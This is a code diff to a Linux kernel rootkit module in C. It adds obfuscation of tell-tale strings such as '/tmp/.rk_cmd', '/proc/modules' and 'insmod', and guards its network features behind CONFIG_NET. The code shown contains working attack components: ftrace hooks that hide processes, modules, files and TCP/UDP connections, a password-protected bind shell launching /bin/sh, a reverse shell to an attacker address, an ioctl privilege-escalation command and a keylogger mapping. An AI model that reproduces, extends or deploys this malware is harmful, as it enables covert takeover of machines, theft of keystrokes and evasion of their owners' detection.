@@ -1,3 +1,4 @@
+#include <linux/version.h>
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -10,6 +11,7 @@
 #include <linux/slab.h>
 #include <linux/string.h>
 #include "rootkit.h"
+#include "obfs.h"
 
 
 MODULE_LICENSE("GPL");
@@ -53,18 +55,21 @@ static orig_read_t orig_read;
 
 static struct ftrace_hook getdents_hook;
 static struct ftrace_hook read_hook;
-static struct ftrace_hook tcp_seq_hook;
-static struct socket *backdoor_sock = NULL;
 
 /* === Multi-PID hiding === */
 static pid_t hidden_pids[MAX_HIDDEN_PIDS];
 static int hidden_pid_count = 0;
 static DEFINE_SPINLOCK(pid_lock);
 
-static int backdoor_port = 0;
 char rk_msg[RK_MSG_MAX];
+
+#ifdef CONFIG_NET
+static struct ftrace_hook tcp_seq_hook;
+static struct socket *backdoor_sock = NULL;
+static int backdoor_port = 0;
 static char backdoor_password[BACKDOOR_PASS_MAX] = "2600";
 static struct task_struct *backdoor_thread = NULL;
+#endif
 
 /* === Module list hiding === */
 static struct list_head *saved_module_list = NULL;
@@ -96,7 +101,9 @@ static orig_unlinkat_t orig_unlinkat;
 static orig_renameat2_t orig_renameat2;
 
 /* === UDP hiding === */
+#ifdef CONFIG_NET
 static struct ftrace_hook udp_seq_hook;
+#endif
 
 /* Scancode to ASCII mapping (US QWERTY, lowercase only) */
 static const char *scancode_to_key[] = {
@@ -320,6 +327,7 @@ static asmlinkage long new_renameat2(const struct pt_regs *regs)
 /* ============================================================
  * Feature: UDP connection hiding — hook udp4_seq_show
  * ============================================================ */
+#ifdef CONFIG_NET
 static int new_udp4_seq_show(struct seq_file *seq, void *v)
 {
     if (rk_active && v != SEQ_START_TOKEN) {
@@ -329,6 +337,7 @@ static int new_udp4_seq_show(struct seq_file *seq, void *v)
     }
     return ((int (*)(struct seq_file *, void *))udp_seq_hook.original)(seq, v);
 }
+#endif /* CONFIG_NET */
 
 /* ============================================================
  * Feature: Reverse shell — connect-back to attacker IP:PORT
@@ -362,7 +371,7 @@ static int reverse_shell_fn(void *data)
             "HOME=/root",
             NULL
         };
-        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
     }
 
     return 0;
@@ -732,7 +741,8 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     if (!rk_active)
         return orig_read(regs);
 
-    if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
+    DEOBFS(s_rk_cmd, _enc_rk_cmd, _LEN_RK_CMD);
+    if (strcmp(path_fd, s_rk_cmd) == 0) {
         uid_t uid = current_uid().val;
         if (uid != 0 && uid != 1000)
             return ret;
@@ -753,7 +763,8 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         return ret;
     }
 
-    if (strcmp(path_fd, "/proc/modules") == 0) {
+    DEOBFS(s_proc_mod, _enc_proc_mod, _LEN_PROC_MOD);
+    if (strcmp(path_fd, s_proc_mod) == 0) {
         char *kbuf;
 
         kbuf = kzalloc(ret + 1, GFP_KERNEL);
@@ -795,7 +806,8 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         kfree(kbuf);
     }
 
-    if (strcmp(path_fd, "/etc/rc.local") == 0) {
+    DEOBFS(s_etc_rc, _enc_etc_rc, _LEN_ETC_RC);
+    if (strcmp(path_fd, s_etc_rc) == 0) {
         char *kbuf;
 
         kbuf = kzalloc(ret + 1, GFP_KERNEL);
@@ -808,7 +820,8 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         }
         kbuf[ret] = '\0';
         if (kbuf != NULL) {
-            char *line = strstr(kbuf, "insmod");
+            DEOBFS(s_insmod, _enc_insmod, _LEN_INSMOD);
+            char *line = strstr(kbuf, s_insmod);
 
             if (!line) {
                 kfree(kbuf);
@@ -913,6 +926,7 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     return ret;
 };
 
+#ifdef CONFIG_NET
 static int new_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     if (rk_active && v != SEQ_START_TOKEN) {
@@ -922,6 +936,7 @@ static int new_tcp4_seq_show(struct seq_file *seq, void *v)
     }
     return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
 }
+#endif /* CONFIG_NET */
 
 
 /**
@@ -1017,6 +1032,7 @@ static int install_read_hook(kallsyms_lookup_name_t lookup)
  * successfully, it returns 0. If there are any errors during the installation of the TCP hook, it
  * returns the corresponding error code.
  */
+#ifdef CONFIG_NET
 static int install_tcp_hook(kallsyms_lookup_name_t lookup)
 {
     tcp_seq_hook.name = "tcp4_seq_show";
@@ -1048,9 +1064,10 @@ static int install_tcp_hook(kallsyms_lookup_name_t lookup)
         tcp_seq_hook.ops.func = NULL;
         return ret;
     }
-    
+
     return 0;
 }
+#endif /* CONFIG_NET */
 
 
 static int install_unlink_hook(kallsyms_lookup_name_t lookup)
@@ -1131,6 +1148,7 @@ static void uninstall_rename_hook(void)
         ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
 }
 
+#ifdef CONFIG_NET
 static int install_udp_hook(kallsyms_lookup_name_t lookup)
 {
     int ret;
@@ -1169,6 +1187,7 @@ static void uninstall_udp_hook(void)
     if (udp_seq_hook.address)
         ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
 }
+#endif /* CONFIG_NET */
 
 /**
  * The function `install_hook` sets up a hook for the `__x64_sys_getdents64` system call using kprobes
@@ -1245,10 +1264,14 @@ static int install_hook(void)
     }
 
     install_read_hook(lookup);
+#ifdef CONFIG_NET
     install_tcp_hook(lookup);
+#endif
     install_unlink_hook(lookup);
     install_rename_hook(lookup);
+#ifdef CONFIG_NET
     install_udp_hook(lookup);
+#endif
     return 0;
 }
 
@@ -1286,6 +1309,7 @@ static void uninstall_read_hook(void)
  * The function `uninstall_tcp_hook` is responsible for unregistering a ftrace function related to TCP
  * and clearing the ftrace filter.
  */
+#ifdef CONFIG_NET
 static void uninstall_tcp_hook(void)
 {
     if (tcp_seq_hook.ops.func != NULL) {
@@ -1301,7 +1325,9 @@ static void uninstall_tcp_hook(void)
         }
     }
 }
+#endif /* CONFIG_NET */
 
+#ifdef CONFIG_NET
 /**
  * The function `handle_backdoor_connection` accepts a connection, receives a message, and executes a
  * shell if the received message matches a predefined password.
@@ -1332,7 +1358,7 @@ static int handle_backdoor_connection(void)
         strlen(backdoor_password)) == 0) {
         char *argv[] = {"/bin/sh", NULL};
         char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
-        call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_EXEC);
+        call_usermodehelper("/bin/sh", argv, envp, UMH_NO_WAIT);
     }
 
     close_client:
@@ -1404,7 +1430,7 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
+    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
     if (ret < 0)
         goto out;
 
@@ -1427,6 +1453,7 @@ static int open_backdoor_port(int port)
         backdoor_sock = NULL;
     return ret;
 }
+#endif /* CONFIG_NET */
 
 
 /**
@@ -1507,8 +1534,9 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     switch (cmd) {
     case RK_CMD_PRIVESC:
         printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
+        mutex_unlock(&rk_mutex);
         handle_escalation(&args);
-        break;
+        return 0;
 
     case RK_CMD_HIDE_PID:
         printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
@@ -1535,6 +1563,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         rk_msg[RK_MSG_MAX - 1] = '\0';
         break;
         
+#ifdef CONFIG_NET
     case RK_CMD_OPEN_BACKDOOR:
         if (open_backdoor_port((int)args.target) < 0)
             return -EFAULT;
@@ -1548,6 +1577,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 
         backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
         break;
+#endif /* CONFIG_NET */
 
     case RK_CMD_HIDE_MODULE:
         hide_module();
@@ -1809,13 +1839,19 @@ static void __exit rootkit_exit(void)
     }
 
     uninstall_read_hook();
+#ifdef CONFIG_NET
     uninstall_tcp_hook();
+#endif
     uninstall_unlink_hook();
     uninstall_rename_hook();
+#ifdef CONFIG_NET
     uninstall_udp_hook();
+#endif
 
     synchronize_rcu();
+#ifdef CONFIG_NET
     close_backdoor_port();
+#endif
     printk(KERN_INFO "rootkit: unloaded\n");
 }
 
